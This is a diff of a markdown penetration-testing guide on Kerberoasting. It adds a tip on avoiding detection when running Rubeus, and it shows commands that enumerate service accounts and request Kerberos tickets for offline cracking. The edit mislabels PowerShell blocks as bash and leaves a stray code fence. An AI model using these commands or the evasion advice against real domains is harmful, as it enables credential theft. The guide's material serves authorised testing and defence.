@@ -20,6 +20,9 @@ For executing **Kerberoasting**, a domain account capable of requesting **TGS ti
 > [!WARNING]
 > **Kerberoasting tools** typically request **`RC4 encryption`** when performing the attack and initiating TGS-REQ requests. This is because **RC4 is** [**weaker**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256.\
 > RC4 (type 23) hashes begin with **`$krb5tgs$23$*`** while AES-256(type 18) start with **`$krb5tgs$18$*`**`.`
+> Moreover, be careful because `Rubeus.exe kerberoast` request tickets automatically over ALL the vulnerable accounts which will get you detected. First, find kerberoastable users with interesting privileges and then run it nly over them.
+
+```bash
 
 #### **Linux**
 
@@ -45,7 +48,7 @@ adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
 
 - **Enumerate Kerberoastable users**
 
-```powershell
+```bash
 # Get Kerberoastable users
 setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
 Get-NetUser -SPN | select serviceprincipalname #Powerview
@@ -54,7 +57,7 @@ Get-NetUser -SPN | select serviceprincipalname #Powerview
 
 - **Technique 1: Ask for TGS and dump it from memory**
 
-```powershell
+```bash
 #Get TGS in memory from a single user
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local
